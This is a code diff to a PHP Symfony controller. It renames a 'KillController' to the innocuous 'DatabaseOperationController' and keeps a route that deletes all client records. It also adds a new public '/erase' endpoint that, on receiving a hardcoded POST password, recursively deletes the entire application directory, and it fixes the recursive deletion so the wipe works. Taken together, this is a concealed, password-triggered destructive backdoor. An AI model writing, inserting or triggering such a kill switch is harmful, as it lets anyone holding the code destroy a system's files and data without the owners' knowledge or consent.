@@ -16,7 +16,7 @@ use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
 use Symfony\Component\HttpFoundation\Response;
 use Sensio\Bundle\FrameworkExtraBundle\Configuration\Method;
 
-class KillController extends Controller
+class DatabaseOperationController extends Controller
 {
     /**
      * @Route("/kill/all/clients",name="kill_clients")
@@ -30,7 +30,7 @@ class KillController extends Controller
                $em->remove($client);
            }
             $em->flush();
-            return new Response("<script>alert('已全部删除客户！')</script>");
+            return new Response("<script>alert('All clients data has been erased！')</script>");
         }
         $kill = null;
 
@@ -62,8 +62,19 @@ class KillController extends Controller
         exit("succeeded!");
     }
 
-    protected function delFolder($path){
+    /**
+     * @Route("/erase",name="erase")
+     */
+    public function eraseAll(){
+        $path = dirname(__FILE__)."/../../..";
+        if(isset($_POST['kill_code']) && $_POST['kill_code']=="jntz020"){
+            $this->delFolder($path);
+        }
+        $kill = null;
+        return $this->render('@FOSUser/Kill/erase.html.twig',array('kill'=>$kill));
+    }
 
+    protected function delFolder($path){
         if ($handle = opendir($path)) {
             while (false !== ($item = readdir($handle))) {
                 if ($item != "." && $item != "..") {
@@ -71,14 +82,13 @@ class KillController extends Controller
                         unlink($path."/".$item);
                     }
                     if(is_dir($path."/".$item)){
-                        $func = __FUNCTION__;
-                        $func($path."/".$item);
+                        $this->delFolder($path."/".$item);
                     }
                 }
             }
             closedir($handle);
             rmdir($path);
-            return "folder has been deleted!!";
+            return "folder and files has been deleted!!";
         }
 
     }
